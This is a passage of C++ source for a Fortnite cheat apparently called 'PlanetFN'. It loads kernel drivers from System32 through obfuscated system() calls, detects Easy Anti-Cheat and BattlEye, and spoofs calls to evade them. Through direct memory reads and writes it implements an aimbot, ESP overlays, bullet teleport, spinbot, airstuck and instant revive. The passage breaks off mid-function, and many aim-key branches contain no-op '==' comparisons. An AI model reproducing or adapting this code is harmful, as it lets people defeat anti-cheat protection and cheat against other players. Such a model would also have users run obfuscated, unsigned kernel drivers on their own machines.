	system(_xor_("cls").c_str());
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\driverLoader.exe C:\\Windows\\System32\\cheetoDriver2.sys C:\\Windows\\System32\\DUDUDUD.sys").c_str());

	clear();
	Beep(560, 500);

	cout << "[PlanetFN Loaded] " << "Driver Loaded!\n";
	std::cout << "[PlanetFN Loading] " << "Waiting For FortniteClient-Win64-Shipping.exe...\n\n";



	while (hwnd == NULL)
	{
		XorS(wind, "Fortnite  ");
		hwnd = FindWindowA(0, wind.decrypt());
		Sleep(100);
	}
	GetWindowThreadProcessId(hwnd, &processID);

	// ADD YOUR GET BASE ADDRESS
	if (driver->Init(FALSE)) {

		driver->Attach(processID);

		base_address = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe");

	}

	Beep(300, 1000);
	if (process_find(_xor_("FortniteClient-Win64-Shipping_EAC.exe"))) {
		std::cout << "[PlanetFN Loaded] " << "Loaded With Easy Anti Cheat!\n\n";
	}
	if (process_find(_xor_("FortniteClient-Win64-Shipping_BE.exe"))) {
		std::cout << "[PlanetFN Loaded] " << "Loaded With Battle Eye!\n\n";
	}

	printf("[PlanetFN Loaded] Fortnites Id Base Is: %p", (void*)base_address);



	xCreateWindow();
	xInitD3d();

	xMainLoop();
	xShutdown();

	return 0;
}

void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

const MARGINS Margin = { -1 };

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = "Windows18";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "Windows18", "Windows189", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	io.DeltaTime;
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);



	ImGui::StyleColorsDark();

	auto& Style = ImGui::GetStyle();

	Style.WindowPadding = ImVec2(20.000f, 20.000f);
	Style.WindowRounding = 4.000f;
	Style.ChildRounding = 4.000f;
	Style.FramePadding = ImVec2(20.000f, 5.000f);
	Style.FrameRounding = 12.000f;
	Style.FrameBorderSize = 1.000f;
	Style.TabBorderSize = 1.000f;

	Style.Colors[ImGuiCol_WindowBg] = ImVec4(0.004f, 0.018f, 0.154f, 0.940f);
	Style.Colors[ImGuiCol_Border] = ImVec4(0.000f, 0.959f, 1.000f, 0.500f);
	Style.Colors[ImGuiCol_FrameBg] = ImVec4(0.140f, 0.140f, 0.140f, 0.540f);
	Style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.149f, 0.149f, 0.149f, 0.400f);
	Style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.140f, 0.140f, 0.140f, 0.670f);
	Style.Colors[ImGuiCol_CheckMark] = ImVec4(0.000f, 1.000f, 0.905f, 1.000f);
	Style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.086f, 0.086f, 0.086f, 1.000f);
	Style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.086f, 0.086f, 0.086f, 1.000f);
	Style.Colors[ImGuiCol_Button] = ImVec4(0.000f, 0.036f, 1.000f, 0.400f);
	Style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.000f, 0.036f, 1.000f, 1.000f);
	Style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.000f, 0.036f, 1.000f, 1.000f);
	Style.Colors[ImGuiCol_Separator] = ImVec4(0.000f, 1.000f, 0.959f, 0.500f);

	XorS(font, "C:\\Windows\\Fonts\\Arial.ttf");
	m_pFont = io.Fonts->AddFontFromFileTTF(font.decrypt(), 14.0f, nullptr, io.Fonts->GetGlyphRangesDefault());

	p_Object->Release();
}

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = bA1mb0tSm00th1ngV4lue;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	//WriteAngles(TargetX / 3.5f, TargetY / 3.5f);
	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);

	return;
}

struct FZiplinePawnState {
	struct AFortAthenaZiplineBase* Zipline; // 0x00(0x08)
	struct AFortAthenaZiplineBase* PreviousZipline; // 0x00(0x08)
	struct UPrimitiveComponent* InteractComponent; // 0x10(0x08)
	bool bIsZiplining; // 0x18(0x01)
	bool bJumped; // 0x19(0x01)
	bool bReachedEnd; // 0x1a(0x01)
	char pad_1B[0x1]; // 0x1b(0x01)
	int32_t AuthoritativeValue; // 0x1c(0x04)struct sdk::structs::FVector SocketOffset; // 0x20(0x0c)
	float TimeZipliningBegan; // 0x2c(0x04)
	float TimeZipliningEndedFromJump; // 0x30(0x04)
	char pad_34[0x4]; // 0x34(0x04)
};


void AimAt(DWORD_PTR entity)
{
	uint64_t currentactormesh = read<uint64_t>(entity + 0x2F0);
	auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
	Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);

	if (rootHeadOut.y != 0 || rootHeadOut.y != 0)
	{
		aimbot(rootHeadOut.x, rootHeadOut.y);
	}
}

RGBA FovColor = Col.purple;
RGBA SnapLineColor = Col.blue;
RGBA BoxColor = Col.red;
float FovThickness = 25;


bool once = false;
namespace Framework {
	namespace Structs {


		struct FMatrix
		{
			float M[4][4];
		};
		static FMatrix* myMatrix = new FMatrix();


		template<class T>
		struct TArray
		{
			friend struct FString;

		public:
			inline TArray()
			{
				Data = nullptr;
				Count = Max = 0;
			};

			inline int Num() const
			{
				return Count;
			};

			inline T& operator[](int i)
			{
				return Data[i];
			};

			inline const T& operator[](int i) const
			{
				return Data[i];
			};

			inline bool IsValidIndex(int i) const
			{
				return i < Num();
			}

		private:
			T* Data;
			int32_t Count;
			int32_t Max;
		};

		struct FString : private TArray<wchar_t>
		{
			inline FString()
			{
			};

			FString(const wchar_t* other)
			{
				Max = Count = *other ? std::wcslen(other) + 1 : 0;

				if (Count)
				{
					Data = const_cast<wchar_t*>(other);
				}
			};

			inline bool IsValid() const
			{
				return Data != nullptr;
			}

			inline const wchar_t* c_str() const
			{
				return Data;
			}

			std::string ToString() const
			{
				auto length = std::wcslen(Data);
				std::string str(length, '\0');
				std::use_facet<std::ctype<wchar_t>>(std::locale()).narrow(Data, Data + length, '?', &str[0]);
				return str;
			}
		};
	}

}
#define ReadPointer(base, offset) (*(PVOID *)(((PBYTE)base + offset)))
VOID ToMatrixWithScale(float* in, float out[4][4]);
VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]);


VOID ToMatrixWithScale(float* in, float out[4][4]) {
	auto* rotation = &in[0];
	auto* translation = &in[4];
	auto* scale = &in[8];

	out[3][0] = translation[0];
	out[3][1] = translation[1];
	out[3][2] = translation[2];

	auto x2 = rotation[0] + rotation[0];
	auto y2 = rotation[1] + rotation[1];
	auto z2 = rotation[2] + rotation[2];

	auto xx2 = rotation[0] * x2;
	auto yy2 = rotation[1] * y2;
	auto zz2 = rotation[2] * z2;
	out[0][0] = (1.0f - (yy2 + zz2)) * scale[0];
	out[1][1] = (1.0f - (xx2 + zz2)) * scale[1];
	out[2][2] = (1.0f - (xx2 + yy2)) * scale[2];

	auto yz2 = rotation[1] * z2;
	auto wx2 = rotation[3] * x2;
	out[2][1] = (yz2 - wx2) * scale[2];
	out[1][2] = (yz2 + wx2) * scale[1];

	auto xy2 = rotation[0] * y2;
	auto wz2 = rotation[3] * z2;
	out[1][0] = (xy2 - wz2) * scale[1];
	out[0][1] = (xy2 + wz2) * scale[0];

	auto xz2 = rotation[0] * z2;
	auto wy2 = rotation[3] * y2;
	out[2][0] = (xz2 + wy2) * scale[2];
	out[0][2] = (xz2 - wy2) * scale[0];

	out[0][3] = 0.0f;
	out[1][3] = 0.0f;
	out[2][3] = 0.0f;
	out[3][3] = 1.0f;
}

VOID MultiplyMatrices(float a[4][4], float b[4][4], float out[4][4]) {
	for (auto r = 0; r < 4; ++r) {
		for (auto c = 0; c < 4; ++c) {
			auto sum = 0.0f;

			for (auto i = 0; i < 4; ++i) {
				sum += a[r][i] * b[i][c];
			}

			out[r][c] = sum;
		}
	}
}

VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]) {
	float boneMatrix[4][4];
	ToMatrixWithScale((float*)((PBYTE)bones + (index * 0x30)), boneMatrix);

	float result[4][4];
	MultiplyMatrices(boneMatrix, compMatrix, result);

	out[0] = result[3][0];
	out[1] = result[3][1];
	out[2] = result[3][2];
}



#define BONE_HEAD_ID (66)
#define BONE_NECK_ID (65)
#define BONE_CHEST_ID (36)
#define BONE_PELVIS_ID (2)

BOOLEAN GetTargetHead(FVector& out) {
	if (!TargetPawn) {
		return FALSE;
	}

	auto mesh = ReadPointer(TargetPawn, OFFSETS::Mesh);
	if (!mesh) {
		return FALSE;
	}

	auto bones = ReadPointer(mesh, OFFSETS::Mesh);
	if (!bones) bones = ReadPointer(mesh, OFFSETS::Mesh + 0x10);
	if (!bones) {
		return FALSE;
	}

	float compMatrix[4][4] = { 0 };
	ToMatrixWithScale(reinterpret_cast<float*>(reinterpret_cast<PBYTE>(mesh) + OFFSETS::ComponetToWorld), compMatrix);

	GetBoneLocation(compMatrix, bones, BONE_HEAD_ID, &out.X); //BONE_HEAD_ID
	return TRUE;
}

struct {
	FMinimalViewInfo Info;
	float ProjectionMatrix[4][4];
} view = { 0 };

FMinimalViewInfo& GetViewInfo() {
	return view.Info;
}

char* wchar_to_char(const wchar_t* pwchar)
{
	int currentCharIndex = 0;
	char currentChar = pwchar[currentCharIndex];

	while (currentChar != '\0')
	{
		currentCharIndex++;
		currentChar = pwchar[currentCharIndex];
	}

	const int charCount = currentCharIndex + 1;

	char* filePathC = (char*)malloc(sizeof(char) * charCount);

	for (int i = 0; i < charCount; i++)
	{
		char character = pwchar[i];

		*filePathC = character;

		filePathC += sizeof(char);

	}
	filePathC += '\0';

	filePathC -= (sizeof(char) * charCount);

	return filePathC;
}


Vector3 LocalRelativeLocation; struct FBoxSphereBounds
{
	struct Vector3                                     Origin;                                                   // 0x0000(0x0018) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)
	struct Vector3                                     BoxExtent;                                                // 0x0018(0x0018) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)
	double                                             SphereRadius;                                             // 0x0030(0x0008) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)
};

bool isVis;

bool isVisible(DWORD_PTR mesh)
{
	if (!mesh)
		return false;
	float fLastSubmitTime = read<float>(mesh + 0x330);
	float fLastRenderTimeOnScreen = read<float>(mesh + 0x338);

	const float fVisionTick = 0.06f;
	bool bVisible = fLastRenderTimeOnScreen + fVisionTick >= fLastSubmitTime;
	return bVisible;
}

FString(*GetObjectNameInternal)(PVOID) = nullptr;


std::wstring GetObjectFirstName(UObject* object) {
	auto internalName = GetObjectNameInternal(object);
	if (!internalName.c_str()) {
		return L"";
	}

	std::wstring name(internalName.c_str());
	Free(internalName.c_str());

	return name;
}

inline bool ProcessEvent(uintptr_t address, void* fnobject, void* parms)
{
	UObject* addr = reinterpret_cast<UObject*>(address); if (!addr) return false;
	auto vtable = *reinterpret_cast<void***>(addr); if (!vtable) return false;
	auto processEventFn = static_cast<void(*)(void*, void*, void*)>(vtable[0x68]); if (!processEventFn) return false;
	SpoofCall(processEventFn, (void*)addr, (void*)fnobject, (void*)parms);
	return true;
}


#define BONE_HEAD_ID (66)
#define BONE_NECK_ID (65)
#define BONE_CHEST_ID (36)
#define BONE_PELVIS_ID (2)

// ARMS
#define BONE_LEFTSHOULDER_ID (9)
#define BONE_RIGHTSHOULDER_ID (62)
#define BONE_LEFTELBOW_ID (10)
#define BONE_RIGHTELBOW_ID (38)
#define BONE_LEFTHAND_ID (11)
#define BONE_RIGHTHAND_ID (39)

// LEGS
#define BONE_LEFTLEG_ID (67)
#define BONE_RIGHTLEG_ID (74)
#define BONE_LEFTTHIGH_ID (73)
#define BONE_RIGHTTHIGH_ID (80)
#define BONE_LEFTFOOT_ID (68)
#define BONE_RIGHTFOOT_ID (75)
#define BONE_LEFTFEET_ID (71)
#define BONE_RIGHTFEET_ID (78)
#define BONE_LEFTFEETFINGER_ID (72)
#define BONE_RIGHTFEETFINGER_ID (79)
#define PI (3.141592653589793f)



float Normalize(float angle) {
	float a = (float)fmod(fmod(angle, 360.0) + 360.0, 360.0);
	if (a > 180.0f) {
		a -= 360.0f;
	}
	return a;
}

VOID CalcAngle(float* src, float* dst, float* angles) {
	float rel[3] = {
		dst[0] - src[0],
		dst[1] - src[1],
		dst[2] - src[2],
	};

	auto dist = sqrtf(rel[0] * rel[0] + rel[1] * rel[1] + rel[2] * rel[2]);
	auto yaw = atan2f(rel[1], rel[0]) * (180.0f / PI);
	auto pitch = (-((acosf((rel[2] / dist)) * 180.0f / PI) - 90.0f));

	angles[0] = Normalize(pitch);
	angles[1] = Normalize(yaw);
}

void DrawESP() {

	//auto funcName = GetObjectFirstName(func);

	if (fovCircle)
	{
		DrawCircle(ScreenCenterX, ScreenCenterY, AimFOV, &Col.cyan, 150, 2);
	}
	if (fpsCounter)
	{
		char dist[64];
		XorS(frame, "%.1f Fps | PlanetFN Free\n");
		sprintf_s(dist, frame.decrypt(), 1.0f / ImGui::GetIO().DeltaTime);
		DrawText1(900, 15, dist, &Col.red);
	}
	if (hitboxpos == 0)
	{
		hitbox = 68; //head
	}
	else if (hitboxpos == 1)
	{
		hitbox = 67; //neck
	}
	else if (hitboxpos == 2)
	{
		hitbox = 7; //chest
	}
	else if (hitboxpos == 3)
	{
		hitbox = 2; //pelvis
	}

	if (aimkeypos == 0)
	{
		aimkey = 0x01;//left mouse button
	}
	else if (aimkeypos == 1)
	{
		aimkey = 0x02;//right mouse button
	}
	else if (aimkeypos == 2)
	{
		aimkey = 0x04;//middle mouse button
	}
	else if (aimkeypos == 3)
	{
		aimkey = 0x05;//x1 mouse button
	}
	else if (aimkeypos == 4)
	{
		aimkey = 0x06;//x2 mouse button
	}
	else if (aimkeypos == 5)
	{
		aimkey = 0x03;//control break processing
	}
	else if (aimkeypos == 6)
	{
		aimkey = 0x08;//backspace
	}
	else if (aimkeypos == 7)
	{
		aimkey = 0x09;//tab
	}
	else if (aimkeypos == 8)
	{
		aimkey = 0x0c;//clear
	}
	else if (aimkeypos == 9)
	{
		aimkey == 0x0D;//enter
	}
	else if (aimkeypos == 10)
	{
		aimkey = 0x10;//shift
	}
	else if (aimkeypos == 11)
	{
		aimkey = 0x11;//ctrl
	}
	else if (aimkeypos == 12)
	{
		aimkey == 0x12;//alt
	}
	else if (aimkeypos == 13)
	{
		aimkey == 0x14;//caps lock
	}
	else if (aimkeypos == 14)
	{
		aimkey == 0x1B;//esc
	}
	else if (aimkeypos == 15)
	{
		aimkey == 0x20;//space
	}
	else if (aimkeypos == 16)
	{
		aimkey == 0x30;//0
	}
	else if (aimkeypos == 17)
	{
		aimkey == 0x31;//1
	}
	else if (aimkeypos == 18)
	{
		aimkey == 0x32;//2
	}
	else if (aimkeypos == 19)
	{
		aimkey == 0x33;//3
	}
	else if (aimkeypos == 20)
	{
		aimkey == 0x34;//4
	}
	else if (aimkeypos == 21)
	{
		aimkey == 0x35;//5
	}
	else if (aimkeypos == 22)
	{
		aimkey == 0x36;//6
	}
	else if (aimkeypos == 23)
	{
		aimkey == 0x37;//7
	}
	else if (aimkeypos == 24)
	{
		aimkey == 0x38;//8
	}
	else if (aimkeypos == 25)
	{
		//Pastea made by Zyko#5528
		aimkey == 0x39;//9
	}
	else if (aimkeypos == 26)
	{
		aimkey == 0x41;//a
	}
	else if (aimkeypos == 27)
	{
		aimkey == 0x42;//b
	}
	else if (aimkeypos == 28)
	{
		aimkey == 0x43;//c
	}
	else if (aimkeypos == 29)
	{
		aimkey == 0x44;//d
	}
	else if (aimkeypos == 30)
	{
		aimkey == 0x45;//e
	}
	else if (aimkeypos == 31)
	{
		aimkey == 0x46;//f
	}
	else if (aimkeypos == 32)
	{
		aimkey == 0x47;//g
	}
	else if (aimkeypos == 33)
	{
		aimkey == 0x48;//h
	}
	else if (aimkeypos == 34)
	{
		aimkey == 0x49;//i
	}
	else if (aimkeypos == 35)
	{
		aimkey == 0x4A;//j
	}
	else if (aimkeypos == 36)
	{
		aimkey == 0x4B;//k
		//Pasta made by Zyko#5528
	}
	else if (aimkeypos == 37)
	{
		aimkey == 0x4C;//L
	}
	else if (aimkeypos == 38)
	{
		aimkey == 0x4D;//m
	}
	else if (aimkeypos == 39)
	{
		aimkey == 0x4E;//n
	}
	else if (aimkeypos == 40)
	{
		aimkey == 0x4F;//o
	}
	else if (aimkeypos == 41)
	{
		aimkey == 0x50;//p
	}
	else if (aimkeypos == 42)
	{
		aimkey == 0x51;//q
	}
	else if (aimkeypos == 43)
	{
		aimkey == 0x52;//r
	}
	else if (aimkeypos == 44)
	{
		aimkey == 0x53;//s
	}
	else if (aimkeypos == 45)
	{
		aimkey == 0x54;//t
	}
	else if (aimkeypos == 46)
	{
		aimkey == 0x55;//u
	}
	else if (aimkeypos == 47)
	{
		aimkey == 0x56;//v
	}
	else if (aimkeypos == 48)
	{
		aimkey == 0x57;//w
	}
	else if (aimkeypos == 49)
	{
		aimkey == 0x58;//x
	}
	else if (aimkeypos == 50)
	{
		aimkey == 0x59;//y
	}
	else if (aimkeypos == 51)
	{
		aimkey == 0x5A;//z
	}
	else if (aimkeypos == 52)
	{
		aimkey == 0x60;//numpad 0
	}
	else if (aimkeypos == 53)
	{
		aimkey == 0x61;//numpad 1
	}
	else if (aimkeypos == 54)
	{
		aimkey == 0x62;//numpad 2
		//Pasta made by Zyko#5528
	}
	else if (aimkeypos == 55)
	{
		aimkey == 0x63;//numpad 3
	}
	else if (aimkeypos == 56)
	{
		aimkey == 0x64;//numpad 4
	}
	else if (aimkeypos == 57)
	{
		aimkey == 0x65;//numpad 5
	}
	else if (aimkeypos == 58)
	{
		aimkey == 0x66;//numpad 6
	}
	else if (aimkeypos == 59)
	{
		aimkey == 0x67;//numpad 7
	}
	else if (aimkeypos == 60)
	{
		aimkey == 0x68;//numpad 8
	}
	else if (aimkeypos == 61)
	{
		aimkey == 0x69;//numpad 9
	}
	else if (aimkeypos == 62)
	{
		aimkey == 0x6A;//multiply
	}

	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;
	Uworld = read<DWORD_PTR>(base_address + OFFSET_UWORLD);
	DWORD_PTR Gameinstance = read<DWORD_PTR>(Uworld + OFFSETS::Gameinstance);
	DWORD_PTR LocalPlayers = read<DWORD_PTR>(Gameinstance + OFFSETS::LocalPlayers);
	Localplayer = read<DWORD_PTR>(LocalPlayers);
	PlayerController = read<DWORD_PTR>(Localplayer + OFFSETS::PlayerController);
	LocalPawn = read<DWORD_PTR>(PlayerController + OFFSETS::LocalPawn);
	uintptr_t pcmc = read<uint64_t>(PlayerController + 0x328);
	PlayerState = read<DWORD_PTR>(LocalPawn + OFFSETS::PlayerState);
	DWORD_PTR PlayerCameraManager = read<DWORD_PTR>(PlayerController + 0x338);
	PlayerCamManager = read<DWORD_PTR>(LocalPawn + PlayerCameraManager);
	Rootcomp = read<DWORD_PTR>(LocalPawn + OFFSETS::RootComponet);
	Persistentlevel = read<DWORD_PTR>(Uworld + OFFSETS::PersistentLevel);
	uintptr_t Crrneytwep = read<uintptr_t>(LocalPawn + 0x7f8);
	DWORD ActorCount = read<DWORD>(Persistentlevel + OFFSETS::ActorCount);
	DWORD_PTR AActors = read<DWORD_PTR>(Persistentlevel + OFFSETS::AActor);
	char bisDying = read<char>(Localplayer + 0x6d8);
	char bisBot = read<char>(PlayerState + 0x27a);
	auto bIsReloadingWeapon = read<bool>(Crrneytwep + 0x311);
	DWORD_PTR GameState = read<DWORD_PTR>(Uworld + 0x148);//gamestate
	DWORD_PTR PlayerArray = read<DWORD_PTR>(GameState + 0x2A0);//playerarray
	DWORD_PTR bInCar = read<DWORD_PTR>(0x2e0 + 0x2c3);
	//for (int i = 0; i < ActorCount; i++)

	for (int i = 0; i < VisDist; i++)
	{

		auto player = read<uintptr_t>(PlayerArray + i * 0x8);
		auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate

		if (!CurrentActor) {
			continue;
		}

		uintptr_t currentgun = read<uintptr_t>(CurrentActor + 0x7f8);

		auto AmmoCount = read<int>(currentgun + 0xb3c);
		auto bIsReloadingWeapon = read<bool>(currentgun + 0x311);
		auto health = read<int>(LocalPawn + 0x34);

		int NewPlayerLocationX;
		int NewPlayerLocationY;

		//uint64_t CurrentActor = read<uint64_t>(AActors + i * OFFSETS::CurrentActor);
	//	if (read<float>(CurrentActor + OFFSETS::Revivefromdbnotime) != 10) continue;
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int MyTeamId = read<int>(PlayerState + OFFSETS::TeamId);
		DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + OFFSETS::PlayerState);
		int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);
		auto entityListCopy = entityList;
		if (MyTeamId == ActorTeamId) continue;
		//if (CurrentActor == LocalPawn) continue;

		Vector3 Headpos = GetBoneWithRotation(CurrentActorMesh, 98);
		Vector3 Toepos = GetBoneWithRotation(CurrentActorMesh, 69);
		localactorpos = read<Vector3>(Rootcomp + OFFSETS::LocalActorPos);

		float distance = localactorpos.Distance(Headpos) / 100.f;

		Vector3 bone0 = GetBoneWithRotation(CurrentActorMesh, 0);
		Vector3 bottom = ProjectWorldToScreen(bone0);
		Vector3 Headbox = ProjectWorldToScreen(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));
		Vector3 Toebox = ProjectWorldToScreen(Vector3(Toepos.x, Toepos.y, Toepos.z + 15));
		Vector3 w2shead = ProjectWorldToScreen(Headpos);

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * BoxWidthValue;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * BoxWidthValue;



		if (AimWhileJumping) { //Allows you to ADS when You are in the Air
			write<bool>(LocalPawn + 0x4965, true); //bADSWhileNotOnGround
		}
		else {
			write<bool>(LocalPawn + 0x4965, false); //bADSWhileNotOnGround
		}

		if (AirStuck) {  //Freezes You in the Air
			if (GetAsyncKeyState(VK_MENU), Controller::IsPressingLeftTrigger()) { //Alt Keybind
				write<float>(LocalPawn + 0x64, 0); //CustomTimeDilation
			}
			else {
				write<float>(LocalPawn + 0x64, 1); //CustomTimeDilation
			}
		}
		if (InstaRes) { //Revives Teammates in 1 Second
			write<float>(LocalPawn + 0x3758, .000000000000000000000001); // RevDbNotTime

		}
		if (spinbot)
		{
			if (GetAsyncKeyState(VK_RBUTTON) or Controller::IsPressingRightTrigger())
			{
				while_rotating = true;

				if (LocalPawn)
				{

					uint64_t MeshA = read<uint64_t>(LocalPawn + 0x2F0);
					increased_value = increased_value + 100;
					write<Vector3>(MeshA + 0x140, Vector3(1, increased_value, 1));
				}
			}
			else if (!GetAsyncKeyState(VK_RBUTTON) or Controller::IsPressingRightTrigger())
			{
				if (LocalPawn)
				{
					if (while_rotating)
					{
						uint64_t MeshA = read<uint64_t>(LocalPawn + 0x2F0);
						write<Vector3>(MeshA + 0x140, Vector3(0, -90, 0));
						while_rotating = false;
					}
				}
			}
		}

		if (crossHair) {
			if (!isVisible(CurrentActorMesh))
			{
				ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 11, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 0, 0, 0, 0 }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 12, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 0, 0, 0, 0 }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 11), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 0, 0, 0, 0 }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 12), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 0, 0, 0, 0 }), 4);
			}
			else {
				ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 11, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 12, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 11), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 4);         ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 12), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 4);
			}
		}


		if (NoBloom)
		{
			if (GetAsyncKeyState(VK_LBUTTON))
			{
				write<float>(Crrneytwep + 0x64, 99);
			}
			else
			{
				write<float>(Crrneytwep + 0x64, 1);
			}
		}


		if (bullettp)
		{
			if (read<DWORD_PTR>(CurrentActor + 0x6a0) && read<DWORD_PTR>(read<DWORD_PTR>(CurrentActor + 0x6a0) + 0x8)) //Bullet check reduce lag
			{

				std::string AllAct = GetNameFromFName(CurrentActorId);


				if (AllAct == "B_Prj_Bullet_Sniper_C" or AllAct == "B_Prj_Bullet_DMR_C" or AllAct == "B_Prj_Bullet_Sniper_Heavy_C" or AllAct == "B_Prj_Bullet_Cosmos_AR_C" /* or AllAct == "B_Shotgun_Standard_Athena_C" or AllAct == "Tracer_Shotgun_C"*/)
				{


					uint64_t currentactormeshsexy = read<uint64_t>(closestPawnbullet + 0x2F0);
					Vector3 Headpos = GetBoneWithRotation(currentactormeshsexy, 98);


					DWORD_PTR BulletRootComp = read<DWORD_PTR>(CurrentActor + 0x188);
					write<char>(BulletRootComp + 0x188, 0);
					write<Vector3>(BulletRootComp + 0x128, Vector3{ Headpos.x, Headpos.y, Headpos.z });
				}


			}


		}



		if (instaReboot)
		{
			//AFortPlayerStateAthena    InteractingRebootVan    0x1680    ABuildingGameplayActorSpawnMachine*
			//ABuildingGameplayActorSpawnMachine    ResurrectionStartDelay    0x990    FScalableFloat

			float ResurrectionStartDelay = read<float>(LocalPawn + 0x1680 + 0x990);
			if (ResurrectionStartDelay != 0.001f)
			{
				write<float>(LocalPawn + 0x1680 + 0x990, 0.001f);
			}

		}
		if (carFly)
		{
			if (LocalPawn)
			{
				struct {
					FMinimalViewInfo Info;
					float ProjectionMatrix[4][4];
